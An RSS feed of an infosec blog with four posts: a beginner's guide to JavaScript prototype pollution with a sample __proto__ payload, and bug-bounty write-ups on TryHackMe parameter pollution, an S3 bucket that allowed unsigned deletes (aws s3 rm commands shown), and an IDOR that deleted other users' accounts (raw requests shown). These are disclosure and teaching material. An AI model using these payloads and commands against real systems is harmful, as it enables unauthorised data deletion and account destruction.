<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on An Avg InfoSec Blog</title>
        <link>https://rootxsudip.github.io/posts/</link>
        <description>Recent content in Posts on An Avg InfoSec Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Thu, 29 Feb 2024 10:20:22 +0530</lastBuildDate>
        <atom:link href="https://rootxsudip.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Demystifying Prototype Pollution for Beginners</title>
            <link>https://rootxsudip.github.io/posts/prototype-pollution-1/</link>
            <pubDate>Thu, 29 Feb 2024 10:20:22 +0530</pubDate>
            
            <guid>https://rootxsudip.github.io/posts/prototype-pollution-1/</guid>
            <description>Before diving into prototype pollution we need to learn about javascript objects and prototype basics.
What is a javascript object? An object in a non-primitive data type which represents a collection of key value pairs. It is to used to store and organize data in a structure manner.
Example code:
//Object let car = { name: &amp;#34;audi&amp;#34;, model: &amp;#34;r8&amp;#34;, engine: &amp;#34;V10&amp;#34; } //Accessing object properties console.log(car.name) console.log(car.model) Constructor: Constructor functions are functions used as blueprints for creating multiple instances of objects with similar properties and methods.</description>
            <content type="html"><![CDATA[<p>Before diving into prototype pollution we need to learn about javascript objects and prototype basics.</p>
<h3 id="what-is-a-javascript-object">What is a javascript object?</h3>
<p>An object in a non-primitive data type which represents a collection of key value pairs. It is to used to store and organize data in a structure manner.</p>
<p><strong>Example code:</strong></p>
<pre tabindex="0"><code>//Object
let car = {
  name: &#34;audi&#34;,
  model: &#34;r8&#34;,
  engine: &#34;V10&#34;
}

//Accessing object properties
console.log(car.name)
console.log(car.model)
</code></pre><h3 id="constructor">Constructor:</h3>
<p>Constructor functions are functions used as blueprints for creating multiple instances of objects with similar properties and methods.<br>
In the below code, we create two instances of car object and the car object act as blueprint.</p>
<h3 id="prototype">Prototype:</h3>
<p>In JavaScript, the prototype is a mechanism that allows objects to inherit properties and methods from other objects. Every JavaScript object has a prototype, which is essentially a reference to another object from which it inherits properties. This inheritance mechanism is fundamental to JavaScript&rsquo;s object-oriented programming paradigm.</p>
<ul>
<li>In simple language, when we create a object or function the js engine attaches a another object to it which have default properties,methods like toString() etc. That another object which is attach to our object is called prototype or <strong>proto</strong></li>
</ul>
<p><strong>Example Code:</strong></p>
<pre tabindex="0"><code>function Car(name,model,engine){
  this.name = name,
  this.model = model,
  this.engine = engine;
}

let car1 = new Car(&#34;Lamborghini&#34;,&#34;Revuelto&#34;,&#34;V12&#34;)
let car2 = new Car(&#34;Nissan&#34;,&#34;Z&#34;,&#34;VR30DDTT&#34;)

//Accessing object
console.log(car1)
console.log(car2)
</code></pre><h4 id="few-key-reasons-why-prototypes-are-used-in-javascript-objects">Few key reasons why prototypes are used in javascript objects</h4>
<ol>
<li>Efficiet Memory Usage: When we create multiple instances of one object, each instance gets it&rsquo;s own memory. Prototype allows to define properties and methods once on the prototype object, which is shared among all the instances which reduces memory usage.</li>
<li>Inheritance: It facilliates inheritance in javascript. When a property or method is accessed on an object, if that property or method does not exist on the object itself, it tries to access the property from prototype chain upto global prototype</li>
<li>Dynamic Modification:  Prototypes can be modified dynamically at runtime. This means that we can add or modify properties and methods on the prototype of an object, and these changes will be reflected in all instances of that object.</li>
<li>Performance Optimization: Accessing properties and methods through prototypes can sometimes be faster than accessing them directly on the object itself.</li>
</ol>
<p><strong>Example Code:</strong></p>
<pre tabindex="0"><code>function Car(name,model,engine){
  this.name = name,
  this.model = model,
  this.engine = engine;
}

//Adding a property in Car prototype
Car.prototype.category = function(){
  console.log(&#34;Sports&#34;)
}

let car1 = new Car(&#34;Lamborghini&#34;,&#34;Revuelto&#34;,&#34;V12&#34;)
let car2 = new Car(&#34;Nissan&#34;,&#34;Z&#34;,&#34;VR30DDTT&#34;)

//Accessing object properties
console.log(car1.category())
console.log(car2.category())
</code></pre><p>Here, car1 and car2 can access the method from their prototype.</p>
<h4 id="prototype-chain">Prototype Chain:</h4>
<p>When a property or method is accessed on an object, JavaScript first looks for it directly on the object itself. If it&rsquo;s not found, JavaScript then follows the prototype chain, traversing through the linked prototype objects until it finds the property or method, or until it reaches the end of the chain (which is typically the Object.prototype).</p>
<p>Here&rsquo;s a breakdown of how the prototype chain works:</p>
<ol>
<li>Object Creation: When an object is created using either object literals, constructor functions, or class syntax, it automatically inherits from a prototype.</li>
<li>Prototype Linkage: Every object (except for the root Object.prototype) has an internal [[Prototype]] property that references another object. This creates a chain of prototypes.</li>
<li>Property Lookup: When accessing a property or method on an object, JavaScript first checks if the property exists directly on the object. If not found, it follows the prototype chain, looking for the property or method in each linked prototype object.</li>
<li>Inheritance: Properties and methods defined in an object&rsquo;s prototype are inherited by all instances of that object. This promotes code reuse and allows for the implementation of inheritance patterns in JavaScript.</li>
<li>Modifying Prototypes Dynamically: Prototypes can be modified dynamically at runtime, allowing for changes to be reflected in all objects that inherit from them. This provides a powerful way to extend and customize the behavior of objects.</li>
</ol>
<h4 id="prototype-pollution">Prototype Pollution:</h4>
<p>Prototype pollution is a vulnerability in JavaScript where an attacker can manipulate the prototype of objects to inject or modify properties and methods, potentially leading to unexpected behavior or security issues. This can occur when the application fails to properly validate and sanitize user input, allowing attackers to craft malicious payloads.
Example:</p>
<pre tabindex="0"><code>// Original object
let data = {
  name: &#34;John&#34;,
  age: 30
};

// Malicious payload
let maliciousPayload = {
  __proto__: {
    isAdmin: true
  }
};

// Merge the original object with the malicious payload
Object.assign(data, maliciousPayload);

// Checking for admin status
console.log(data.isAdmin); // Outputs: true
</code></pre><ol>
<li>We have an original object data with properties name and age.</li>
<li>An attacker crafts a malicious payload malicious Payload with <strong>proto</strong> property pointing to an object with an isAdmin property set to true.</li>
<li>We then use Object.assign() to merge the original object data with the malicious payload. This results in the isAdmin property being added to the data object.</li>
<li>Now, when we check for the isAdmin property on data, it returns true, even though it wasn&rsquo;t originally part of the object. This demonstrates how the attacker was able to pollute the prototype chain and inject unauthorized properties.</li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Hacking TryHackMe for Fun and Bounties 👀 Part 2</title>
            <link>https://rootxsudip.github.io/posts/hacking-tryhackme-for-fun-and-bounties-part-2/</link>
            <pubDate>Sun, 05 Jun 2022 18:53:44 +0530</pubDate>
            
            <guid>https://rootxsudip.github.io/posts/hacking-tryhackme-for-fun-and-bounties-part-2/</guid>
            <description>Hello guys, here is the 2nd part of blog. This is the most critical bug i have ever found in TryHackMe, using this bug an attacker can edit and delete any rooms of THM.
I uploaded the POC video to Youtube.
Shortest Bug Explanation: Any room is edited through a parameter with a room name, i created two room with two different accounts. While deleting/editing the 1st room name i intercepted the request and change the 1st room to 2nd room name, it throwed 403.</description>
            <content type="html"><![CDATA[<p>Hello guys, here is the 2nd part of blog. This is the most critical bug i have ever found in TryHackMe, using this bug an attacker can edit and delete any rooms of THM.<br>
I uploaded the POC video to Youtube.<br>
<strong>Shortest Bug Explanation:</strong> Any room is edited through a parameter with a room name, i created two room with two different accounts. While deleting/editing the 1st room name i intercepted the request and change the 1st room to 2nd room name, it throwed 403. In next attempt i added a second parameter(Parameter Pollution) with the 2nd room name, the check bypassed and the other room got delete/edited.<br>
<strong>POC video:</strong><br>
<a href="https://youtu.be/eNfgWbU1N3M"><img src="https://img.youtube.com/vi/eNfgWbU1N3M/hqdefault.jpg" alt="Hacking THM Part 2"></a></p>
]]></content>
        </item>
        
        <item>
            <title>Hacking TryHackMe for Fun and Bounties 👀 Part 1</title>
            <link>https://rootxsudip.github.io/posts/hacking-tryhackme-for-fun-and-bounties-part-1/</link>
            <pubDate>Sun, 22 May 2022 09:04:21 +0530</pubDate>
            
            <guid>https://rootxsudip.github.io/posts/hacking-tryhackme-for-fun-and-bounties-part-1/</guid>
            <description>Hello guys, during my hunting i find two vulnerabilities in THM, today i will talk about the first vuln which is S3 Bucket misconfiguration.
If you don’t know what is s3 bucket and how it leads to vulns check the references.
1. S3 Bucket Misconfiguation Leads to deletion of any images(profile,room images,banner etc..) When, uploading my profile pic, i saw it was uploaded to a s3 bucket.
My first thought was can i perform read, upload and delete operation in the S3 bucket?</description>
            <content type="html"><![CDATA[<p>Hello guys, during my hunting i find two vulnerabilities in THM, today i will talk about the first vuln which is S3 Bucket misconfiguration.<br>
If you don’t know what is s3 bucket and how it leads to vulns check the references.</p>
<h3 id="1-s3-bucket-misconfiguation-leads-to-deletion-of-any-imagesprofileroom-imagesbanner-etc">1. S3 Bucket Misconfiguation Leads to deletion of any images(profile,room images,banner etc..)</h3>
<p>When, uploading my profile pic, i saw it was uploaded to a s3 bucket.<br>
My first thought was can i perform read, upload and delete operation in the S3 bucket?<br>
After that i tried 3 operations in the bucket: READ, UPLOAD, DELETE<br>
<strong>AWS S3 Commands:</strong></p>
<ul>
<li>❌ READ Contents: aws s3 ls s3://bucket-name/ –no-sign-request</li>
<li>❌ Upload Content: aws s3 cp poc.txt s3://bucket-name/poc.txt –no-sign-request</li>
<li>✅ Delete Content: aws rm s3://bucketname/user-avatars/my-pic.jpeg –no-sign-request<br>
Only delete operation was successfull, this proved that i can delete any pics from the bucket.</li>
</ul>
<p><strong>Impact:</strong><br>
An attacker can delete any pic in TryHackMe which includes profile pic of anyusers,room icon, room banner etc..</p>
<p><strong>How I made the POC:</strong></p>
<ul>
<li>Upload a pic in my 2nd account.</li>
<li>Visit my 2nd account’s public profile from the 1st account.</li>
<li>Using inspect, i copied the profile pic of that 2nd account.</li>
<li>Deleted the pic using aws command -&gt; aws s3 rm s3://tryhackme-images/user-avatars/2ndpic.png –no-sign-request</li>
</ul>
<p><strong>How to find S3 Buckets?</strong>:</p>
<ul>
<li>Check website’s source code(JS,HTML)</li>
<li>Check CSP headers</li>
<li>Google and Github dorking</li>
<li>Use Tools like <a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a> etc..</li>
</ul>
<p><strong>Some References:</strong></p>
<ul>
<li><a href="https://blog.lightspin.io/how-to-access-aws-s3-buckets">https://blog.lightspin.io/how-to-access-aws-s3-buckets</a></li>
<li><a href="https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/?utm_source=blog&amp;utm_campaign=s3_buckets">https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/?utm_source=blog&amp;utm_campaign=s3_buckets</a></li>
<li><a href="https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007">https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007</a></li>
</ul>
<p>When I reported the misconfiguation, they fixed it quickly in one day and rewarded me $$$</p>
<p>Thanks for reading and wait for the part 2 :)</p>
]]></content>
        </item>
        
        <item>
            <title>How Was I Able to Delete Any Account of an Organization Using Idor</title>
            <link>https://rootxsudip.github.io/posts/how-was-i-able-to-delete-any-account-of-an-organization-using-idor/</link>
            <pubDate>Fri, 10 Sep 2021 09:37:47 +0530</pubDate>
            
            <guid>https://rootxsudip.github.io/posts/how-was-i-able-to-delete-any-account-of-an-organization-using-idor/</guid>
            <description>Hello, amazing hackers my name is Sudip Roy and i am an InfoSec student and part-time Bug Hunter.This is my first writeup about a critical vulnerability which i found on a website(Vdp). Hope you guys will like it and learn something new from it.
Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution. For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page.</description>
            <content type="html"><![CDATA[<p>Hello, amazing hackers my name is Sudip Roy and i am an InfoSec student and part-time Bug Hunter.This is my first writeup about a critical vulnerability which i found on a website(Vdp). Hope you guys will like it and learn something new from it.</p>
<p>Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution. For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page. I request for the delete account and checked the request in burpsuite and send the request to repeater and drop it.</p>
<p>The request looked like this(1st IDOR):</p>
<pre><code>DELETE /account/customer? HTTP/1.1
Host: redacted-api.redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 42
X-Is-redacted--Sign: &lt;some-token&gt;
X-Is-redacted--Token: &lt;some-token&gt;
X-Is-redacted-Ajax: true
Cache-Control: no-store,max-age=0
Origin: https://dashboard.redacted.com
Referer: https://dashboard.redacted.com/profile
Te: trailers
Connection: close

{&quot;uid&quot;:&quot;4adddbea4e3646a0b951ce4822075707&quot;}
</code></pre>
<p>Now, after looking the request, we can easily identify uid(user identification) parameter is used so the website maybe prone to idor. I made 2nd account and request for the delete account feature, the request was exactly same and uid is different. I copy the uid code of the 2nd account and replace uid code with first request’s code. After sending the request the my 2nd account was successfully deleted.(1st IDOR)</p>
<p>Here the impact is nothing because how will the attacker get’s the victim’s uid. So i needed to find the victim’s uid.</p>
<p>After spending some time with the website, i found that i can invite a team-member to my app which i created when signing up in the website. So i invited the user to my app and checked the requests made by website. While checking i found this interesting request:</p>
<pre><code>GET /team/userprofile?email=nexas60891%40rebation.com&amp; HTTP/1.1
Host: adminconsole-api.redacted.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Is-redacted--Sign: &lt;some-token&gt;
X-Is-redacted--Token: &lt;some-token&gt;
X-Is-redacted-Ajax: true
Cache-Control: no-store,max-age=0
Origin: https://dashboard.redacted.com
Referer: https://dashboard.redacted.com/teams
Te: trailers
Connection: close
</code></pre>
<p>I send the request to the repeater and send the request. The request showed some information related to the victim’s email including uid code. Response:</p>
<pre><code>HTTP / 1.1 200 OK
Server: nginx
Date: Fri, 10 Sep 2021 05: 11: 57 GMT
Content - Type: application / json;
charset = utf - 8
Connection: close
aca - request - id: 9 f2c40e0 - 11 f5 - 11e c - b525 - 9 f29fd8a2e9a
Access - Control - Allow - Headers: Content - Type, Cache - Control, Authorization, Content - Length, X - Requested - With, X - Is - redacted - Ajax, X - Is - redacted--Token, X - Is - redacted--Sign
Access - Control - Allow - Methods: GET, PUT, POST, DELETE, OPTIONS
Access - Control - Allow - Origin: https: //dashboard.redacted.com
  ETag: W / &quot;d8d-UnkAQfkFjrEDJEI34fj1dAMTHHw&quot;
Strict - Transport - Security: max - age = 1234000;
includeSubDomains
Vary: Origin, Accept - Encoding
X - Frame - Options: SAMEORIGIN
X - Powered - By: PHP 5.2.0
X - XSS - Protection: 1;
mode = block
X - Server: admin_root_primary
Access - Control - Max - Age: 3600
Content - Length: 3469

{
  &quot;Identities&quot;: null,
  &quot;Password&quot;: &quot;**********&quot;,
  &quot;LastPasswordChangeDate&quot;: null,
  &quot;PasswordExpirationDate&quot;: &quot;2021-12-08T11:51:01.6230000Z&quot;,
  &quot;LastPasswordChangeToken&quot;: null,
  &quot;EmailVerified&quot;: true,
  &quot;IsActive&quot;: true,
  &quot;IsDeleted&quot;: false,
  &quot;Uid&quot;: &quot;858fb2cafd0c454096322e30d059722a&quot;,
  &quot;CustomFields&quot;: {
    &quot;IsPrivacyPolicyAccepted&quot;: &quot;false&quot;,
    &quot;gclid&quot;: &quot;&quot;,
    &quot;utm_campaign&quot;: &quot;&quot;,
    &quot;utm_medium&quot;: &quot;&quot;,
    &quot;utm_source&quot;: &quot;&quot;,
    &quot;cf_PlanType&quot;: &quot;{\&quot;rebation-roqagari\&quot;:\&quot;free\&quot;}&quot;,
    &quot;roleInfo&quot;: &quot;{\&quot;role\&quot;:\&quot;Developer\&quot;,\&quot;lookingFor\&quot;:\&quot;for product research\&quot;}&quot;
  },
  &quot;IsEmailSubscribed&quot;: false,
  &quot;UserName&quot;: null,
  &quot;NoOfLogins&quot;: 2,
  &quot;PhoneId&quot;: null,
  &quot;PhoneIdVerified&quot;: false,
  &quot;Roles&quot;: null,
  &quot;ExternalUserLoginId&quot;: null,
  &quot;RegistrationProvider&quot;: &quot;Email&quot;,
  &quot;IsLoginLocked&quot;: false,
  &quot;LoginLockedType&quot;: &quot;None&quot;,
  &quot;LastLoginLocation&quot;: &quot;redacted, India&quot;,
  &quot;RegistrationSource&quot;: &quot;https://accounts.redacted.com/auth.aspx?return_url=https://dashboard.redacted.com/login&amp;action=register&amp;source=email&quot;,
  &quot;IsCustomUid&quot;: false,
  &quot;UnverifiedEmail&quot;: null,
  &quot;IsSecurePassword&quot;: null,
  &quot;PrivacyPolicy&quot;: null,
  &quot;ExternalIds&quot;: null,
  &quot;IsRequiredFieldsFilledOnce&quot;: true,
  &quot;ConsentProfile&quot;: null,
  &quot;PIN&quot;: null,
  &quot;RegistrationData&quot;: null,
  &quot;ID&quot;: &quot;69877142c7644ef8a954a0a07f05cdca&quot;,
  &quot;Provider&quot;: &quot;Email&quot;,
  &quot;Prefix&quot;: null,
  &quot;FirstName&quot;: &quot;Victim&quot;,
  &quot;MiddleName&quot;: null,
  &quot;LastName&quot;: null,
  &quot;Suffix&quot;: null,
  &quot;FullName&quot;: &quot;Victim&quot;,
  &quot;Email&quot;: [{
    &quot;Type&quot;: &quot;Primary&quot;,
    &quot;Value&quot;: &quot;nexas60891@rebation.com&quot;
  }],
  &quot;Country&quot;: null,
  &quot;Positions&quot;: null,
  &quot;Educations&quot;: null,
  &quot;PhoneNumbers&quot;: null,
  &quot;IMAccounts&quot;: null,
  &quot;Addresses&quot;: null,
  &quot;MainAddress&quot;: null,
  &quot;Created&quot;: null,
  &quot;CreatedDate&quot;: &quot;null&quot;,
  &quot;ModifiedDate&quot;: &quot;null&quot;,
}
</code></pre>
<p>I copy the uid from this response and replace with uid code in the 1st acccount’s request -&gt; Send the request -&gt; The victim’s account was permanently deleted.</p>
<ul>
<li>Another thing i noticed that <a href="https://adminconsole-api.redacted.com/team/userprofile?email=">https://adminconsole-api.redacted.com/team/userprofile?email=</a>&amp; HTTP/1.1 This email parameter takes any email and return it’s uid so i can delete any dev. or admin’s account easily.</li>
</ul>
<p>Takeaways:</p>
<ol>
<li>Always checks for idor if any uid/guid or number present in the request and check every http request using burp.</li>
<li>One IDOR tip -&gt;
<img src="https://pbs.twimg.com/media/EOZ5WtnXkAMMGqA?format=png&amp;name=small" alt="https://twitter.com/intigriti/status/1217794181982302208/photo/1"></li>
</ol>
<p>Thankyou, for reading :v: You can follow me, I retweet and tweet related to Bug Bounty and InfoSec -&gt; <a href="https://twitter.com/0xsudip">https://twitter.com/0xsudip</a></p>
]]></content>
        </item>
        
    </channel>
</rss>
